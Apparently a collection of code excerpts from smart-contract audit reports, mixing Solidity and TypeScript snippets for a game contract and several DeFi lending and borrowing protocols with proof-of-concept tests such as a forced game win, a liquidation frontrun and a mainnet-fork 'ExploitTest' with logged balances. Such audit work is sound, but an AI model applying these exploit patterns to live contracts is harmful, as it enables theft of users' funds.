"```\nfunction _killWoundedAgents(\n    uint256 roundId,\n    uint256 currentRoundAgentsAlive\n) private returns (uint256 deadAgentsCount) {\n    for (uint256 i = 0; i < woundedAgentIdsCount; ) {\n        uint256 woundedAgentId = woundedAgentIdsInRound[i + 1];\n\n        uint256 index = agentIndex(woundedAgentId);\n        if (agents[index].status == AgentStatus.Wounded) {\n            // rest of code\n        }\n\n        i = i.add(1);\n    }\n\n    emit Killed(roundId, woundedAgentIds);\n}\n```\n```\nif (activeAgents > NUMBER_OF_SECONDARY_PRIZE_POOL_WINNERS) {\n    uint256 woundedAgents = _woundRequestFulfilled(\n        currentRoundId,\n        currentRoundAgentsAlive,\n        activeAgents,\n        currentRandomWord\n    );\n\n    uint256 deadAgentsFromKilling;\n    if (currentRoundId > ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD) {\n        deadAgentsFromKilling = _killWoundedAgents({\n            roundId: currentRoundId.sub(ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD),\n            currentRoundAgentsAlive: currentRoundAgentsAlive\n        });\n    }\n```\n```\nfunction test_poc() public {\n    _startGameAndDrawOneRound();\n\n    uint256[] memory randomWords = _randomWords();\n    uint256[] memory woundedAgentIds;\n\n    for (uint256 roundId = 2; roundId <= ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD + 1; roundId++) {\n        if (roundId == 2) {\n            (woundedAgentIds, ) = infiltration.getRoundInfo({roundId: 1});\n            assertEq(woundedAgentIds.length, 20);\n\n            _drawXRounds(1);\n\n            _heal({roundId: 3, woundedAgentIds: woundedAgentIds});\n\n            _startNewRound();\n\n            uint256 agentIdThatWasKilled = woundedAgentIds[0];\n\n            IInfiltration.HealResult[] memory healResults = new IInfiltration.HealResult[](20);\n            for (uint256 i; i < 20; i++) {\n                healResults[i].agentId = woundedAgentIds[i];\n\n                if (woundedAgentIds[i] == agentIdThatWasKilled) {\n                    healResults[i].outcome = IInfiltration.HealOutcome.Killed;\n                } else {\n                    healResults[i].outcome = IInfiltration.HealOutcome.Healed;\n                }\n            }\n\n            expectEmitCheckAll();\n            emit HealRequestFulfilled(3, healResults);\n\n            expectEmitCheckAll();\n            emit RoundStarted(4);\n\n            randomWords[0] = (69 * 10_000_000_000) + 9_900_000_000; // survival rate 99%, first one gets killed\n\n            vm.prank(VRF_COORDINATOR);\n            VRFConsumerBaseV2(address(infiltration)).rawFulfillRandomWords(_computeVrfRequestId(3), randomWords);\n\n            for (uint256 i; i < woundedAgentIds.length; i++) {\n                if (woundedAgentIds[i]!= agentIdThatWasKilled) {\n                    _assertHealedAgent(woundedAgentIds[i]);\n                }\n            }\n\n            roundId += 2; // round 2, 3 used for healing\n        }\n\n        _startNewRound();\n\n        randomWords[0] += roundId;\n\n        if (roundId == ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD + 1) {\n            (uint256[] memory woundedAgentIdsFromRound, ) = infiltration.getRoundInfo({\n                roundId:"
"```\nuint256 activeAgents = gameInfo.activeAgents;\n\nif (activeAgents == 1) {\n    revert GameOver();\n}\n```\n```\nuint256 agentId = agents[1].agentId;\n_agentOwnership(agentId);\n```\n```\nfunction test_forceWin() public {\n    address attacker = address(1337);\n\n    // Prefund attacker and user1\n    vm.deal(user1, PRICE * MAX_MINT_PER_ADDRESS);\n    vm.deal(attacker, PRICE * MAX_MINT_PER_ADDRESS);\n\n    // MINT some agents\n    vm.warp(_mintStart());\n    // Attacker wants to make sure he owns a bunch of agents with low IDs!!\n    vm.prank(attacker);\n    infiltration.mint{value: PRICE * 30}({quantity: 30});\n    // For simplicity, we mint only 1 agent to user 1 here, but it could be more, they could get wounded, etc.\n    vm.prank(user1);\n    infiltration.mint{value: PRICE * 1}({quantity: 1});\n    // Attacker also wants a bunch of agents with the highest IDs, as they are getting swapped with the killed agents (move forward)\n    vm.prank(attacker);\n    infiltration.mint{value: PRICE * 30}({quantity: 30});\n\n    vm.warp(_mintEnd());\n\n    // Start the game\n    vm.prank(owner);\n    infiltration.startGame();\n\n    vm.prank(VRF_COORDINATOR);\n    uint256[] memory randomWords = new uint256[](1);\n    randomWords[0] = 69_420;\n    VRFConsumerBaseV2(address(infiltration)).rawFulfillRandomWords(_computeVrfRequestId(1), randomWords);\n\n    // Now we are in round 2. We do have 1 wounded agent (but we can imagine any of our agent got wounded, doesn't really matter)\n\n    // We know with our HARDCODED RANDOMNESS that AGENT 3 gets wounded!!\n\n    // Whenever we get in a situation, that we own all active agents, but 1 and our agent has a lower index, we can instant win the game!!\n    // This is done by escaping all agents, at once, except the lowest index\n    uint256[] memory escapeIds = new uint256[](59);\n    escapeIds[0] = 1;\n    escapeIds[1] = 2;\n    uint256 i = 4; // Skipping our wounded AGENT 3\n    for (; i < 31;) {\n        escapeIds[i - 2] = i;\n        unchecked {++i;}\n    }\n    // Skipping 31 as this owned by user1\n    unchecked {++i"
"```\nfunction heal(uint256[] calldata agentIds) external nonReentrant {\n    _assertFrontrunLockIsOff();\n    if (gameInfo.activeAgents <= NUMBER_OF_SECONDARY_PRIZE_POOL_WINNERS) {\n        revert HealingDisabled();\n    }\n```\n```\nfunction escape(uint256[] calldata agentIds) external nonReentrant {\n    _assertFrontrunLockIsOff();\n\n    uint256 agentIdsCount = agentIds.length;\n    _assertNotEmptyAgentIdsArrayProvided(agentIdsCount);\n\n    uint256 activeAgents = gameInfo.activeAgents;\n    uint256 activeAgentsAfterEscape = activeAgents - agentIdsCount;\n    _assertGameIsNotOverAfterEscape(activeAgentsAfterEscape);\n\n    uint256 currentRoundAgentsAlive = agentsAlive();\n\n    uint256 prizePool = gameInfo.prizePool;\n    uint256 secondaryPrizePool = gameInfo.secondaryPrizePool;\n    uint256 reward;\n    uint256[] memory rewards = new uint256[](agentIdsCount);\n\n    for (uint256 i = 0; i < agentIdsCount; i++) {\n        uint256 agentId = agentIds[i];\n        _assertAgentOwnership(agentId);\n\n        uint256 index = agentIndex(agentId);\n        _assertAgentStatus(agents[index], agentId, AgentStatus.Active);\n\n        uint256 totalEscapeValue = prizePool / currentRoundAgentsAlive;\n        uint256 rewardForPlayer = (totalEscapeValue * _escapeMultiplier(currentRoundAgentsAlive)) / ONE_HUNDRED_PERCENT_IN_BASIS_POINTS;\n        rewards[i] = rewardForPlayer;\n        reward += rewardForPlayer;\n\n        uint256 rewardToSecondaryPrizePool = (totalEscapeValue.unsafeSubtract(rewardForPlayer) * _escapeRewardSplitForSecondaryPrizePool(currentRoundAgentsAlive)) / ONE_HUNDRED_PERCENT_IN_BASIS_POINTS;\n\n        unchecked {\n            prizePool = prizePool - rewardForPlayer - rewardToSecondaryPrizePool;\n        }\n        secondaryPrizePool += rewardToSecondaryPrizePool;\n\n        _swap({\n            currentAgentIndex: index,\n            lastAgentIndex: currentRoundAgentsAlive,\n            agentId: agentId,\n            newStatus: AgentStatus.Escaped\n        });\n\n        unchecked {\n            --currentRoundAgentsAlive;\n        }\n    }\n\n    // gameInfo.activeAgents = uint16(activeAgentsAfterEscape);\n    // gameInfo.escapedAgents += uint16(agentIdsCount);\n}"
"```\nfunction test_heal_in_next_round_v1() public {\n    _startGameAndDrawOneRound();\n\n    _drawXRounds(11);\n\n    (uint256[] memory woundedAgentIds,) = infiltration.getRoundInfo({roundId: 12});\n\n    address agentOwner = _ownerOf(woundedAgentIds[0]);\n    looks.mint(agentOwner, HEAL_BASE_COST);\n\n    vm.startPrank(agentOwner);\n    _grantLooksApprovals();\n    looks.approve(TRANSFER_MANAGER, HEAL_BASE_COST);\n\n    uint256[] memory agentIds = new uint256[](1);\n    agentIds[0] = woundedAgentIds[0];\n\n    uint256[] memory costs = new uint256[](1);\n    costs[0] = HEAL_BASE_COST;\n\n    (,,,,, uint40 currentRoundId,,,,,) = infiltration.gameInfo();\n    assert(currentRoundId == 13);\n\n    IInfiltration.Agent memory agentInfo = infiltration.getAgent(woundedAgentIds[0]);\n    assert(agentInfo.woundedAt == 12);\n\n    vm.expectRevert(IInfiltration.HealingMustWaitAtLeastOneRound.selector);\n    infiltration.heal(agentIds);\n}\n```"
"```\nfunction test_fulfillRandomWords_revert() public {\n    _startGameAndDrawOneRound();\n\n    _drawXRounds(48);\n\n    uint256 counter = 0;\n    uint256[] memory wa = new uint256[](30);\n    uint256 totalCost = 0;\n\n    for (uint256 j = 2; j <= 6; j++) {\n        (uint256[] memory woundedAgentIds, ) = infiltration.getRoundInfo({roundId: j});\n\n        uint256[] memory costs = new uint256[](woundedAgentIds.length);\n        for (uint256 i = 0; i < woundedAgentIds.length; i++) {\n            costs[i] = HEAL_BASE_COST;\n            wa[counter] = woundedAgentIds[i];\n            counter++;\n            if (counter > 29) break;\n        }\n\n        if (counter > 29) break;\n    }\n\n    totalCost = HEAL_BASE_COST * wa.length;\n    looks.mint(user1, totalCost);\n\n    vm.startPrank(user1);\n    _grantLooksApprovals();\n    looks.approve(TRANSFER_MANAGER, totalCost);\n\n    infiltration.heal(wa);\n    vm.stopPrank();\n\n    _drawXRounds(1);\n}\n```"
"```\nstruct Observation {\n    uint32 blockTimestamp;\n    int56 tickCumulative;\n    uint160 secondsPerLiquidityCumulativeX128;\n    bool initialized;\n}\n```\n```\nAssume we are looking for the target=10 timestamp.\n\nAnd the observations array looks like this (element values are timestamps):\n\n| 12 | 20 | 25 | 30 | 1 | 1 | 1 |\n\nThe length of the array is 7.\n\nLet's say we provide the index 6 as the seed and the current observationIndex is 3 (i.e., pointing to timestamp 30).\n\nThe Oracle.observe function then chooses 1 as the left timestamp and 12 as the right timestamp.\n\nThis means the invalid and uninitialized element at index 6 with timestamp 1 will be used to calculate the Oracle values.\n```"
"```\nslot0 = slot0_ | ((block.timestamp + LIQUIDATION_GRACE_PERIOD) << 208);\n```\n```\n_repay(repayable0, repayable1);\nslot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT\n```\n```\nfunction test_liquidationFrontrun() public {\n    uint256 margin0 = 1595e18;\n    uint256 margin1 = 0;\n    uint256 borrows0 = 0;\n    uint256 borrows1 = 1e18 * 100;\n\n    margin0 += 1;\n\n    deal(address(asset0), address(account), margin0);\n    deal(address(asset1), address(account), margin1);\n\n    bytes memory data = abi.encode(Action.BORROW, borrows0, borrows1);\n    account.modify(this, data, 1 << 32);\n\n    assertEq(lender0.borrowBalance(address(account)), borrows0);\n    assertEq(lender1.borrowBalance(address(account)), borrows1);\n    assertEq(asset0.balanceOf(address(account)), borrows0 + margin0);\n    assertEq(asset1.balanceOf(address(account)), borrows1 + margin1);\n\n    _setInterest(lender0, 10100);\n    _setInterest(lender1, 10100);\n\n    account.warn(1 << 32);\n\n    uint40 unleashLiquidationTime = uint40((account.slot0() + 208) % (1 << 40));\n    assertEq(unleashLiquidationTime, block.timestamp + LIQUIDATION_GRACE_PERIOD);\n\n    skip(LIQUIDATION_GRACE_PERIOD + 1);\n\n    account.liquidate(this, bytes(""""), 1e10, 1 << 32);\n\n    unleashLiquidationTime = uint40((account.slot0() + 208) % (1 << 40));\n    assertEq(unleashLiquidationTime, 0);\n\n    vm.expectRevert();\n    account.liquidate(this, bytes(""""), 1, 1 << 32);\n}\n```"
"```\npragma solidity 0.8.17;\n\nimport ""forge-std/Test.sol"";\nimport ""src/libraries/constants/Constants.sol"";\nimport ""src/libraries/constants/Q.sol"";\nimport ""src/libraries/Positions.sol"";\nimport ""src/Borrower.sol"";\nimport ""src/Factory.sol"";\nimport ""src/Lender.sol"";\nimport ""src/RateModel.sol"";\nimport ""./Utils.sol"";\n\ncontract RateModelMax is IRateModel {\n    uint256 private constant _A = 6.1010463348e20;\n    uint256 private constant _B = _A / 1e18;\n\n    function getYieldPerSecond(uint256 utilization, address) external pure returns (uint256) {\n        unchecked {\n            return (utilization < 0.99e18)? _A / (1e18 - utilization) - _B : MAX_RATE;\n        }\n    }\n}\n\ncontract ExploitTest is Test, IManager, ILiquidator {\n    IUniswapV3Pool constant pool = IUniswapV3Pool(0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8);\n    ERC20 constant asset0 = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    ERC20 constant asset1 = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n    Lender immutable lender0;\n    Lender immutable lender1;\n    Borrower immutable account;\n\n    constructor() {\n        vm.createSelectFork(vm.rpcUrl(""mainnet""));\n        vm.rollFork(15_348_451);\n\n        Factory factory = new FatFactory(\n            address(0),\n            address(0),\n            VolatilityOracle(address(new VolatilityOracleMock())),\n            new RateModelMax()\n        );\n\n        factory.createMarket(pool);\n        (lender0, lender1, ) = factory.getMarket(pool);\n        account = factory.createBorrower(pool, address(this), bytes12(0));\n    }\n\n    function setUp() public {\n        // deal to lender and deposit (so that there are assets to borrow)\n        deal(address(asset0), address(lender0), 10000e18); // DAI\n        deal(address(asset1), address(lender1), 10000e18); // WETH\n        lender\n```\nUser borrow:: 10629296791890000000000\nUser stored borrow:: 10000000000000000000000\nBefore liquidation User borrow:: 10630197795010000000000\nBefore liquidation User stored borrow:: 10630197795010000000000\nBefore liquidation User assets:: 10051000000000000000000\nLiquidated User borrow:: 579197795010000000001\nLiquidated User assets:: 0"
```\nreturn SoladyMath.sqrt(\n    (4e24 * volumeGamma0Gamma1 * scale) /\n    (b.timestamp - a.timestamp) / tickTvl\n)
"```\nIs the admin/owner of the protocol/contracts TRUSTED or RESTRICTED?\n\nRestricted. The governor address should not be able to steal funds or prevent users from withdrawing. It does have access to the govern methods in Factory, and it could trigger liquidations by increasing nSigma. We consider this an acceptable risk, and the governor itself will have a timelock.\n```"
"```\n""The realized volatility of most assets hover between 75% and 200% annualized in ETH terms. If we compare this to the IV extracted from the Uniswap v3 pools, we get:\n\nNote that the volatilities are somewhat lower, perhaps a factor of ~2.5, for most assets.""\n```"
"```\nfunction test_badDebtLiquidationAnte() public {\n    uint256 margin0 = 1e18;\n    uint256 borrows0 = 100e18;\n\n    deal(address(asset0), address(account), margin0);\n\n    bytes memory data = abi.encode(Action.BORROW, borrows0, 0);\n    account.modify(this, data, 1 << 32);\n\n    _setInterest(lender0, 15000);\n\n    emit log_named_uint(""User borrow:"", lender0.borrowBalance(address(account)));\n    emit log_named_uint(""User assets:"", asset0.balanceOf(address(account)));\n\n    account.warn(1 << 32);\n\n    skip(LIQUIDATION_GRACE_PERIOD);\n    lender0.accrueInterest();\n\n    vm.expectRevert();\n    account.liquidate(this, bytes(""""), 1, 1 << 32);\n\n    account.liquidate(this, bytes(""""), type(uint256).max, 1 << 32);\n\n    emit log_named_uint(""Liquidated User borrow:"", lender0.borrowBalance(address(account)));\n    emit log_named_uint(""Liquidated User assets:"", asset0.balanceOf(address(account)));\n    emit log_named_uint(""Liquidated User ante:"", address(account).balance);\n}\n```\n```\nUser borrow:: 150000000000000000000\nUser assets:: 101000000000000000000\nLiquidated User borrow:: 49000000162000000001\nLiquidated User assets:: 0\nLiquidated User ante:: 10000000000000001"
```\nliqCumL + uint160(\n    ((liqCumR - liqCumL) * delta) / denom\n)\n```\nbeforeOrAt.secondsPerLiquidityCumulativeX128 +\n    uint160(\n        (\n            uint256(\n                atOrAfter.secondsPerLiquidityCumulativeX128\n                - beforeOrAt.secondsPerLiquidityCumulativeX128\n            )\n            * targetDelta\n        )\n        / observationTimeDelta\n    )\n```\n```\nsecondsPerLiquidityCumulativeX128: \n    last.secondsPerLiquidityCumulativeX128 + \n    ((uint160(delta) << 128) / (liquidity > 0? liquidity : 1))\n```\n```\n(liqCumR - liqCumL) * delta = 3.4e38 * 86400 * 86400 > 1.5e48\n```
"```\nassembly (""memory-safe"") {\n    liabilities0 := div(liabilities0, strain) // @audit rounds down to 0 <-\n    liabilities1 := div(liabilities1, strain) // @audit rounds down to 0 <-\n}\n```\n```\n_repay(repayable0, repayable1);\nslot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;\n\npayable(callee).transfer(address(this).balance / strain);\nemit Liquidate(repayable0, repayable1, incentive1, priceX128);\n```"
"```\nfunction _prepareTake(\n    Liquidation memory liquidation_,\n    uint256 t0Debt_,\n    uint256 collateral_,\n    uint256 inflator_\n) internal view returns (TakeLocalVars memory vars) {\n    vars.auctionPrice = _auctionPrice(liquidation_.referencePrice, kickTime);\n    vars.bondFactor   = liquidation_.bondFactor;\n    vars.bpf          = _bpf(\n        vars.borrowerDebt,\n        collateral_,\n        neutralPrice,\n        liquidation_.bondFactor,\n        vars.auctionPrice\n    );\n```\n```\nif (vars_.auctionPrice > vars_.bucketPrice):\n    revert AuctionPriceGtBucketPrice()\n\nif params_.depositTake:\n    vars_.auctionPrice = vars_.bucketPrice\n```\nvars_ = _calculateTakeFlowsAndBondChange(\n    borrower_.collateral,\n    params_.inflator,\n    params_.collateralScale,\n    vars_\n)\n\n_rewardBucketTake(\n    auctions_,\n    deposits_,\n    buckets_,\n    liquidation,\n    params_.index,\n    params_.depositTake,\n    vars_\n)"
"```\nif TP < NP:\n    BPF = bondFactor * min(1, max(-1, (NP - price) / (NP - TP)))\nelse:\n    if price <= NP:\n        BPF = bondFactor\n    else:\n        BPF = -bondFactor\n```\nfunction _bpf(\n    uint256 debt_,\n    uint256 collateral_,\n    uint256 neutralPrice_,\n    uint256 bondFactor_,\n    uint256 auctionPrice_\n) public pure returns (int256) {\n    int256 thresholdPrice = int256(Maths.wdiv(debt_, collateral_));\n\n    int256 sign;\n    if (thresholdPrice < int256(neutralPrice_)) {\n        sign = Maths.minInt(\n            1e18,\n            Maths.maxInt(\n                -1 * 1e18,\n                PRBMathSD59x18.div(\n                    int256(neutralPrice_) - int256(auctionPrice_),\n                    int256(neutralPrice_) - thresholdPrice\n                )\n            )\n        );\n    } else {\n        int256 val = int256(neutralPrice_) - int256(auctionPrice_);\n        if (val < 0) {\n            sign = -1e18;\n        } else if (val!= 0) {\n            sign = 1e18; // Sign will be zero when NP = auctionPrice\n        }\n    }\n\n    return PRBMathSD59x18.mul(int256(bondFactor_), sign);\n}\n```"
"```\nfunction drawDebt(\n    address borrowerAddress_,\n    uint256 amountToBorrow_,\n    uint256 limitIndex_,\n    uint256 collateralToPledge_\n) external nonReentrant {\n    PoolState memory poolState = _accruePoolInterest();\n\n    DrawDebtResult memory result = BorrowerActions.drawDebt(\n        auctions,\n        deposits,\n        loans,\n        poolState,\n        _availableQuoteToken(),\n        borrowerAddress_,\n        amountToBorrow_,\n        limitIndex_,\n        collateralToPledge_\n    );\n\n    // update pool interest rate state\n    _updateInterestState(poolState, result.newLup);\n}\n```\n```\nif (poolState_.t0Debt!= 0) {\n    if (poolState_.t0Debt!= 0) {\n        uint256 elapsed = block.timestamp - inflatorState.inflatorUpdate;\n        poolState_.isNewInterestAccrued = elapsed!= 0;\n    }\n}\n```\n```\nif (poolState_.isNewInterestAccrued) {\n    inflatorState.inflator = uint208(poolState_.inflator)\n    inflatorState.inflatorUpdate = uint48(block.timestamp)\n} else if (poolState_.debt == 0) {\n    inflatorState.inflator = uint208(Maths.WAD)\n    inflatorState.inflatorUpdate = uint48(block.timestamp)\n}\n```\n```\nfunction testPoolBorrowAndRepay() external tearDown {\n    assertEq(_quote.balanceOf(address(_pool)), 50_000 * 1e18);\n    assertEq(_quote.balanceOf(_lender), 150_000 * 1e18);\n\n    // skip 100 days to break test\n    skip(100 days);\n\n    _drawDebt({\n        from: _borrower,\n        borrower: _borrower,\n        amountToBorrow: 21_000 * 1e18,\n        limitIndex: 3_000,\n        collateralToPledge: 100 * 1e18,\n        newLup: 2_981.007422784467321543 * 1e18\n    });\n}\n```"
"```\nif (price_ < MIN_PRICE || price_ > MAX_PRICE):\n    revert BucketPriceOutOfBounds()\n```\n```\nfunction _settleAuction(\n    AuctionsState storage auctions_,\n    mapping(uint256 => Bucket) storage buckets_,\n    DepositsState storage deposits_,\n    address borrowerAddress_,\n    uint256 borrowerCollateral_,\n    uint256 poolType_\n) internal returns (uint256 remainingCollateral_, uint256 compensatedCollateral_) {\n    uint256 auctionPrice = _auctionPrice(\n        auctions_.liquidations[borrowerAddress_].referencePrice,\n        auctions_.liquidations[borrowerAddress_].kickTime\n    );\n\n    uint256 bucketIndex = auctionPrice > MIN_PRICE? _indexOf(auctionPrice) : MAX_FENWICK_INDEX;\n}\n```\n```\nvars.referencePrice = Maths.min(Maths.max(vars.htp, vars.neutralPrice), MAX_INFLATED_PRICE)\n```"
"```\n_v3SwapExactInput(\n    v3SwapExactInputParams({\n        fee: params.fee,\n        tokenIn: cache.holdToken,\n        tokenOut: cache.saleToken,\n        amountIn: holdTokenAmountIn,\n        amountOutMinimum: (\n            saleTokenAmountOut * params.slippageBP1000\n        ) / Constants.BPS\n    })\n)\n```\n_removeKeysAndClearStorage(borrowing.borrower, params.borrowingKey, loans);\n\n_pay(borrowing.holdToken, address(this), msg.sender, holdTokenBalance);\n_pay(borrowing.saleToken, address(this), msg.sender, saleTokenBalance);\n\nemit Repay(borrowing.borrower, msg.sender, params.borrowingKey);\n```\n```\nfunction removeKey(bytes32[] storage self, bytes32 key) internal {\n    uint256 length = self.length;\n    for (uint256 i = 0; i < length; ) {\n        if (self.unsafeAccess(i).value == key) {\n            self.unsafeAccess(i).value = self.unsafeAccess(length - 1).value;\n            self.pop();\n            break;\n        }\n        i++;\n    }\n}\n```\n_pay(oldBorrowing.holdToken, msg.sender, VAULT_ADDRESS, collateralAmt + feesDebt);\nemit TakeOverDebt(oldBorrowing.borrower, msg.sender, borrowingKey, newBorrowingKey);\n```\n```\nVault(VAULT_ADDRESS).transferToken(\n    borrowing.holdToken,\n    address(this),\n    borrowing.borrowedAmount + liquidationBonus\n)"
"```\nfunction ownerOf(uint256 tokenId) public view virtual override returns (address) {\n    return _tokenOwners.get(tokenId);\n}\n```\n```\naddress creditor = underlyingPositionManager.ownerOf(loan.tokenId);\n_increaseLiquidity(cache.saleToken, cache.holdToken, loan, amount0, amount1)\n```\nfor (uint256 i; i < loans.length; ) {\n    LoanInfo memory loan = loans[i];\n    address creditor = underlyingPositionManager.ownerOf(loan.tokenId);\n    if (creditor == msg.sender) {\n```"
"```\nfunction _getCurrentSqrtPriceX96(\n    bool zeroForA,\n    address tokenA,\n    address tokenB,\n    uint24 fee\n) private view returns (uint160 sqrtPriceX96) {\n    if (!zeroForA) {\n        (tokenA, tokenB) = (tokenB, tokenA);\n    }\n    address poolAddress = computePoolAddress(tokenA, tokenB, fee);\n    (sqrtPriceX96,,,,,, ) = IUniswapV3Pool(poolAddress).slot0();\n}\n```\n```\n(uint256 holdTokenAmountIn, uint256 amount0, uint256 amount1) = \n    _getHoldTokenAmountIn(\n        params.zeroForSaleToken,\n        cache.tickLower,\n        cache.tickUpper,\n        cache.sqrtPriceX96,\n        loan.liquidity,\n        cache.holdTokenDebt\n    );\n```\n```\nlet amountWBTC = ethers.utils.parseUnits(""0.05"", 8); // token0\nconst deadline = (await time.latest()) + 60;\nconst minLeverageDesired = 50;\nconst maxCollateralWBTC = amountWBTC.div(minLeverageDesired);\n\nconst loans = [\n  {\n    liquidity: nftpos[3].liquidity,\n    tokenId: nftpos[3].tokenId,\n  },\n];\n\nconst swapParams: ApproveSwapAndPay.SwapParamsStruct = {\n  swapTarget: constants.AddressZero,\n  swapAmountInDataIndex: 0,\n  maxGasForCall: 0,\n  swapData: swapData,\n};\n\nlet params = {\n  internalSwapPoolfee: 500,\n  saleToken: WETH_ADDRESS,\n  holdToken: WBTC_ADDRESS,\n  minHoldTokenOut: amountWBTC,\n  maxCollateral: maxCollateralWBTC,\n  externalSwap: swapParams,\n  loans: loans,\n};\n\nawait borrowingManager.connect(bob).borrow(params, deadline);\n\nconst borrowingKey = await borrowingManager.userBorrowingKeys(bob.address, 0);\n\nconst swapParamsRep: ApproveSwapAndPay.SwapParamsStruct = {\n  swapTarget: constants.AddressZero,\n  swapAmountInDataIndex: 0,\n  maxGasForCall: 0,\n  swapData: swapData,\n};\n\namountWBTC = ethers.utils.parseUnits(""0.06"", 8); // token0\n\nlet swapping: ISwapRouter.ExactInputSingleParamsStruct = {\n  tokenIn: WBTC_ADDRESS,\n  tokenOut: WETH_ADDRESS,\n  fee: 500,\n  recipient: alice.address,\n  deadline: deadline,\n  amountIn: ethers.utils.parseUnits(""100"", 8),\n  amountOutMinimum: 0,\n  sqrtPriceLimitX96: 0,\n};\n\nawait router.connect(alice).exactInputSingle(swapping);\nconsole.log(""Swap success"");\n\nlet paramsRep: LiquidityBorrowingManager.RepayParamsStruct = {\n  isEmergency: false,\n  internalSwapPoolfee: 500,\n  externalSwap: swapParamsRep,\n  borrowingKey: borrowingKey,\n  swapSlippageBP1000: 990, // <= slippage simulated\n};\n\nawait borrowingManager.connect(bob).repay(paramsRep, deadline);\n```"
"```\nfunction _addKeysAndLoansInfo(\n    bool update,\n    bytes32 borrowingKey,\n    LoanInfo[] memory sourceLoans\n) private {\n    LoanInfo[] storage loans = loansInfo[borrowingKey];\n\n    for (uint256 i = 0; i < sourceLoans.length; i++) {\n        LoanInfo memory loan = sourceLoans[i];\n\n        bytes32[] storage tokenIdLoansKeys = tokenIdToBorrowingKeys[loan.tokenId];\n\n        update\n           ? tokenIdLoansKeys.addKeyIfNotExists(borrowingKey)\n            : tokenIdLoansKeys.push(borrowingKey);\n    }\n```\n```\nfunction computeBorrowingKey(\n    address borrower,\n    address saleToken,\n    address holdToken\n) internal pure returns (bytes32) {\n    return keccak256(abi.encodePacked(borrower, saleToken, holdToken));\n}\n```\n```\nfunction addKeyIfNotExists(bytes32[] storage self, bytes32 key) internal {\n    uint256 length = self.length;\n    for (uint256 i = 0; i < length; ) {\n        if (self[i].value == key) {\n            return;\n        }\n        unchecked {\n            i++;\n        }\n    }\n    self.push(key);\n}\n\nfunction removeKey(bytes32[] storage self, bytes32 key) internal {\n    uint256 length = self.length;\n    for (uint256 i = 0; i < length; ) {\n        if (self[i].value == key) {\n            self[i].value = self[length - 1].value;\n            self.pop();\n            break;\n        }\n        unchecked {\n            i++;\n        }\n    }\n}\n```"
"```\nif gt(swapAmountInDataValue, 0) {\n    mstore(add(add(ptr, 0x24), mul(swapAmountInDataIndex, 0x20)), swapAmountInDataValue)\n}\nsuccess := call(\n    maxGas,\n    target,\n    0, // value\n    ptr, // Inputs are stored at location ptr\n    data.length,\n    0,\n    0\n)\n```"
"```\naddress creditor = underlyingPositionManager.ownerOf(loan.tokenId);\n\n_increaseLiquidity(cache.saleToken, cache.holdToken, loan, amount0, amount1);\n\nuint256 liquidityOwnerReward = FullMath.mulDiv(\n    params.totalfeesOwed,\n    cache.holdTokenDebt,\n    params.totalBorrowedAmount\n) / Constants.COLLATERAL_BALANCE_PRECISION;\n\nVault(VAULT_ADDRESS).transferToken(cache.holdToken, creditor, liquidityOwnerReward);\n```"
```\nuint256 borrowingCollateral = cache.borrowedAmount - cache.holdTokenBalance;\n```
"```\nit(""Updated accRate is incorrect"", async () => {\n    const amountWBTC = ethers.utils.parseUnits(""0.05"", 8); // token0\n    let deadline = (await time.latest()) + 60;\n    const minLeverageDesired = 50;\n    const maxCollateralWBTC = amountWBTC.div(minLeverageDesired);\n\n    const loans = [\n        {\n            liquidity: nftpos[3].liquidity,\n            tokenId: nftpos[3].tokenId,\n        },\n        {\n            liquidity: nftpos[5].liquidity,\n            tokenId: nftpos[5].tokenId,\n        },\n    ];\n\n    const swapParams: ApproveSwapAndPay.SwapParamsStruct = {\n        swapTarget: constants.AddressZero,\n        swapAmountInDataIndex: 0,\n        maxGasForCall: 0,\n        swapData: swapData,\n    };\n\n    const borrowParams = {\n        internalSwapPoolfee: 500,\n        saleToken: WETH_ADDRESS,\n        holdToken: WBTC_ADDRESS,\n        minHoldTokenOut: amountWBTC,\n        maxCollateral: maxCollateralWBTC,\n        externalSwap: swapParams,\n        loans: loans,\n    };\n\n    await borrowingManager.connect(bob).borrow(borrowParams, deadline);\n\n    await time.increase(3600 * 72); // 72h so 2 days of missing collateral\n    deadline = (await time.latest()) + 60;\n\n    const borrowingKey = await borrowingManager.userBorrowingKeys(bob.address, 0);\n\n    let repayParams = {\n        isEmergency: true,\n        internalSwapPoolfee: 0,\n        externalSwap: swapParams,\n        borrowingKey: borrowingKey,\n        swapSlippageBP1000: 0,\n    };\n\n    const oldBorrowingInfo = await borrowingManager.borrowingsInfo(borrowingKey);\n    const dailyRateCollateral = await borrowingManager.checkDailyRateCollateral(borrowingKey);\n\n    await expect(borrowingManager.connect(alice).repay(repayParams, deadline)).to.be.revertedWithPanic();\n});"
"```\nif (\n    collateralBalance > 0 &&\n    (currentFees + borrowing.feesOwed) / Constants.COLLATERAL_BALANCE_PRECISION >\n    Constants.MINIMUM_AMOUNT\n) {\n    liquidationBonus +=\n        uint256(collateralBalance) /\n        Constants.COLLATERAL_BALANCE_PRECISION;\n} else {\n    currentFees = borrowing.dailyRateCollateralBalance;\n}\n```\n```\nliquidationBonus += uint256(collateralBalance) / Constants.COLLATERAL_BALANCE_PRECISION;\n```\n```\nVault(VAULT_ADDRESS).transferToken(\n    borrowing.holdToken,\n    address(this),\n    borrowing.borrowedAmount + liquidationBonus\n)\n```\n_pay(borrowing.holdToken, address(this), msg.sender, holdTokenBalance);\n_pay(borrowing.saleToken, address(this), msg.sender, saleTokenBalance);\n```"
